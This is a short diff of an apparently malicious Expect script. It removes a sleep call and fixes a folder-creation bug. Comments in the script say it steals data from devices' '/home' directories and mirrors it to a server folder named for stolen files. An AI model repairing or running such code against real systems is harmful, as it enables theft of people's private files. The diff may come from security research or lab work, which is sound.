@@ -45,7 +45,6 @@ expect {
 			exit 1
 	}
 }
-sleep 5
 set timeout 10
 
 
@@ -143,7 +142,7 @@ while {1 > 0} {
 
 	# create a folder for the files of the device
 	set device_folder "$stolen_files_storage_folder/$tick_port"
-	file mkdir device_folder
+	file mkdir $device_folder
 	
 	# the malicious behavior starts stealing data in the '/home' directory
 	# to store the data the folders are mirrored on the server
